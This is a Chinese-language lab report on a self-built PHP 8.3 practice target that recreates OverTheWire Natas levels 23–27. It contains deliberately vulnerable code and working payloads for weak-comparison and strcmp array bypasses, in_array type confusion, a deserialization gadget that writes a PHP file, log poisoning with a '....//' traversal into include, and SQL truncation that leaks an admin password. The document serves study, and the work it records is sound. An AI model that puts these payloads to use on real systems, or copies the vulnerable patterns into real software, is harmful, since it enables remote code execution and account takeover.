# S2 補強：四類 PHP 特有漏洞（真實 PHP 8.3 環境）

> 補強 OverTheWire Natas 實戰中發現的四個缺口。
>
> 對應研究報告 **CH06 S1**，並延續 **S2g（Natas 20–27）** 的發現。

- 日期：2026-10-19
- 新增靶場：`phplab/`（**真實 PHP 8.3.35 環境**）
- **驗證結果：6/6 全部通過**
- **完整洩漏**：`FLAG{sql_truncation_secret_2026}`

---

## 一、為什麼這次用「真實 PHP」

這四類漏洞（弱比較、strcmp 陣列、反序列化、SQL 截斷）都是
**PHP 語言特有的行為**——用 Python 模擬會失真。

因此這次**下載並安裝了真實 PHP 8.3.35**：

```
下載：https://windows.php.net/downloads/releases/php-8.3.35-nts-Win32-vs16-x64.zip
解壓：32.3 MB → php.exe 可直接執行
驗證：PHP 8.3.35 (cli) (NTS Visual C++ 2019 x64)
```

**這讓驗證結果有真實的語言語意，而不是模擬。**

---

## 二、靶場設計（phplab/，6 個端點）

| 端點 | 漏洞 | 對應 Natas |
|---|---|---|
| `/p1` | 弱比較（`strstr` + 數字比較） | natas23 |
| `/p2` | **strcmp 陣列繞過**（PHP 7 行為模擬） | natas24 |
| `/p2-safe` | 安全對照（`is_string` 檢查） | — |
| `/p3` | in_array 型別混淆（版本差異） | 同類 |
| `/p4` | **PHP 反序列化**（`__destruct` 寫檔） | natas26 |
| `/p5` | **Log Poisoning + LFI** | natas25 |
| `/p6` | **SQL 截斷 + 正規化不一致** | natas27 |

---

## 三、★ 最重要的發現：PHP 7 vs PHP 8 的版本差異

**同一個漏洞在不同 PHP 版本行為不同**。實測數據：

| 比較 | PHP 7 行為 | PHP 8.3.35 實測 |
|---|---|---|
| `"11iloveyou" > 10` | True | **True**（仍有效） |
| `"1e2" == "100"` | True | **True**（仍有效） |
| `"abc" == 0` | True | **False**（已修復） |
| `strcmp(array, "")` | **NULL → !NULL = True** | **拋出 TypeError**（已修復） |
| `in_array(0, ["admin"])` | 可能 True | **False**（已修復） |

### 這對滲透測試的意義

> **必須確認目標的 PHP 版本**——
> 同樣的 payload 在 PHP 7 有效、在 PHP 8 無效。

**本靶場的 P2 用 `null` 明確模擬 PHP 7 行為**，並在驗證中同時說明 PHP 8 的差異。

---

## 四、P1 · 弱比較（natas23）

```php
if(strstr($passwd, 'iloveyou') && ($passwd > 10)) { ... }
```

**實測**：
```
GET /p1?passwd=11iloveyou → P1_WIN
GET /p1?passwd=1iloveyou  → P1_WIN（也是 True，因為字串比較）
```

**原理**：PHP 弱比較——`"11iloveyou"` 轉數字 = 11 > 10 ✓

---

## 五、P2 · strcmp 陣列繞過（natas24）

```php
if(!strcmp($passwd, "")) { ... }
```

**實測**：
```
GET /p2?passwd[]=x（陣列）
  → P2_ARRAY r=NULL（PHP 7 模擬）→ !NULL = true → P2_WIN
GET /p2?passwd=x（字串）
  → P2_STRING r=1 → P2_FAIL
安全對照 /p2-safe?passwd[]=x
  → 被阻擋（is_string 檢查）✓
```

**原理**：PHP 7 的 `strcmp(array, string)` 回傳 **NULL**，`!NULL` = True。

**PHP 8 已修復**：拋出 `TypeError: strcmp(): Argument #1 must be of type string, array given`

---

## 六、P3 · in_array 型別混淆

```php
in_array($role, ['admin', 'root']);   // ★ 沒有 strict=true
```

**實測**：
```
GET /p3?role=admin → P3_WIN
GET /p3?role=0     → P3_FAIL（PHP 8 已修正 0 == 'admin'）
```

**教學價值**：這是**版本差異**的活教材。

---

## 七、P4 · PHP 反序列化（natas26）

```php
class Logger {
    public $logFile, $initMsg, $exitMsg;
    function __destruct() {
        @file_put_contents($this->logFile, $this->exitMsg, FILE_APPEND);
    }
}
$obj = @unserialize(base64_decode($data));
```

**構造序列化物件**：
```python
fields = [("logFile", "/abs/path/shell.php"),
          ("initMsg", "start"),
          ("exitMsg", "<?php echo 'P4_SHELL_EXECUTED'; ?>")]
ser = 'O:6:"Logger":3:{s:7:"logFile";s:...;...}'
```

**實測**：
```
反序列化: 成功
★ 寫檔結果: 已寫入
檔案內容: '<?php echo 'P4_SHELL_EXECUTED'; ?>'
```

**驗證方式**：反序列化後**檢查目標檔案是否真的被寫入**（而不只是看回應）。

---

## 八、P5 · Log Poisoning + LFI（natas25）

**機制**：
```php
// ① 寫 log（UA 可控）
file_put_contents($LAB.'/logs/poison.log', $ua."\n", FILE_APPEND);
// ② LFI（錯誤的過濾）
if (strpos($page, '../') !== false) $page = str_replace('../', '', $page);
include($LAB . '/pages/' . $page);
```

**實測**：
```
步驟 1: UA = "<?php echo 'P5_LOG_POISONED'; ?>"
步驟 2: GET /p5?page=....//logs/poison.log
        → '....//' 經 str_replace 後變成 '../'
        → pages/../logs/poison.log → include → PHP 執行
★ 注入結果: PHP 被執行 = True
```

> **任意寫入點 + LFI = RCE**——這是 natas25 的完整鏈。

---

## 九、P6 · SQL 截斷 + 正規化不一致（natas27，本次最精彩）

### 9.1 三個函式做不同正規化

| 函式 | username 處理 | 長度 |
|---|---|---|
| 註冊 `createUser` | `substr($u, 0, 64)` | **截斷成 64** |
| 登入 `checkCredentials` | 完整輸入 | 完整 |
| 輸出 `dumpData` | **`trim($u)`** | **trim 後** |

### 9.2 利用步驟（實測）

```
① 註冊：u = "admin" + 空格*59 + "x"（65 字元）
   · trim 檢查：尾端是 x → 通過
   · substr(0,64) = "admin" + 空格*59（64 字元）→ 入庫

② 登入：u = "admin" + 空格*59（64 字元），p = "mypass"
   · checkCredentials 匹配**我們插入的記錄** ✓

③ dumpData：trim(u) = "admin"（5 字元）
   · 查詢 username='admin' → 匹配**原始的 admin 記錄**
   · → 印出真實密碼
```

**實測輸出**：
```
P6_REGISTER_OK | input_len=65 stored_len=64
P6_LOGIN_OK | dump=Array (
    [0] => Array (
        [id] => 1
        [username] => admin
        [password] => FLAG{sql_truncation_secret_2026}
    )
)
★ 洩漏: FLAG = True
```

> **用自己設定的密碼登入，卻拿到別人的資料。**

---

## 十、四類漏洞的核心本質

| # | 類別 | 核心 |
|---|---|---|
| P1/P2/P3 | **型別混淆** | 「同一個值」在不同型別下比較結果不同 |
| P4 | **反序列化** | 「資料」被當成「程式碼」 |
| P5 | **日誌注入** | 「程式碼」被寫進「資料存放處」再被 include |
| P6 | **正規化不一致** | **「你驗證的」≠「你查詢的」** |

---

## 十一、開發時踩到的坑（真實環境才會遇到）

### 坑 1：PHP 的 PDO SQLite 驅動沒載入

```
Fatal error: Uncaught PDOException: could not find driver
```

**原因**：下載的 PHP 沒有 `php.ini`，`pdo_sqlite` 擴充未啟用。

**修正**：建立 `php.ini`
```ini
extension_dir = ".../ext"
extension=pdo_sqlite
extension=sqlite3
```

### 坑 2：PHP 8 的 `strcmp(array)` 已經拋 TypeError

無法直接重現 natas24。

**修正**：在靶場中用 `null` **明確模擬 PHP 7 行為**，並在驗證中說明差異。

> **這是誠實的做法**：不假裝 PHP 8 仍有該漏洞，而是明確標註「PHP 7 模擬」。

---

## 十二、檔案與複現

```
vuln-lab/phplab/
├── phplab.php             # 靶場（6 端點，真實 PHP）
├── verify_phplab.py       # 驗證（6/6）
├── php.ini                # PHP 設定（啟用 pdo_sqlite）
└── phplab.db              # SQLite（自動建立）
vuln-lab/findings/
└── phplab_verification.txt
```

**複現**：
```powershell
# 1. 下載 PHP（本專案用 8.3.35）
# 2. 啟動
$env:TEMP\php83\php.exe -S 127.0.0.1:8970 -t . phplab.php

# 3. 驗證
python vuln-lab/phplab/verify_phplab.py 8970
```

**手動練習**：
```
P1: http://127.0.0.1:8970/p1?passwd=11iloveyou
P2: http://127.0.0.1:8970/p2?passwd[]=x
P3: http://127.0.0.1:8970/p3?role=admin
P4: http://127.0.0.1:8970/p4?data=<base64>
P5: http://127.0.0.1:8970/p5?page=....//logs/poison.log
P6: http://127.0.0.1:8970/p6?u=<65字元>&p=<任意>
```

---

## 十三、結論

### 補強成果

| 缺口 | 靶場 | 驗證 |
|---|---|---|
| 弱比較 / 型別混淆 | `phplab` P1/P2/P3 | ✅ |
| PHP 反序列化 | `phplab` P4 | ✅ |
| Log Poisoning | `phplab` P5 | ✅ |
| SQL 截斷 + 正規化不一致 | `phplab` P6 | ✅ |

### 三個核心學習

1. **版本很重要**：同樣 payload 在 PHP 7 有效、PHP 8 修復
2. **真實環境不可替代**：PHP 的型別語意用模擬會失真
3. **「不一致」是漏洞溫床**：截斷 vs trim vs 原樣 → 你驗證的不是你查詢的

### 本專案現在的完整度

```
靶場：19 個（新增 phplab，真實 PHP）
驗證型態：21 種（新增「PHP 特有漏洞」）
報告：31 份
```

---

*本文件為教育用途的實作記錄。使用本機下載的 PHP 8.3.35，
所有測試 100% 在本機自建靶場完成。*
